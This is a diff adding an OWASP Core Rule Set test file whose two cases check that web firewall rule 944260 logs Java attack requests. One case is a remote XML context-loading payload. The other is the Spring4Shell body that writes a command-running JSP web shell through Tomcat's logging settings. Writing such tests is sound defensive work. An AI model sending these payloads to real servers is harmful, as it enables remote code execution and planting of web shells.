@@ -1,0 +1,39 @@
+---
+meta:
+  author: "theMiddle"
+  enabled: true
+  name: "944260.yaml"
+  description: "Positive tests for rule 944260"
+tests:
+  - test_title: 944260-1
+    desc: "CVE-2022-22963"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 80
+            headers:
+              Host: "localhost"
+              User-Agent: "OWASP CRS test agent"
+              Content-Type: "application/x-www-form-urlencoded"
+            method: "POST"
+            version: "HTTP/1.1"
+            data: "_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://127.1.2.3/wb.xml')"
+          output:
+            log_contains: "id \"944260\""
+  - test_title: 944260-2
+    desc: "Spring Framework RCE"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 80
+            headers:
+              Host: "localhost"
+              User-Agent: "OWASP CRS test agent"
+              Content-Type: "application/x-www-form-urlencoded"
+            method: "POST"
+            version: "HTTP/1.1"
+            data: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+          output:
+            log_contains: "id \"944260\""
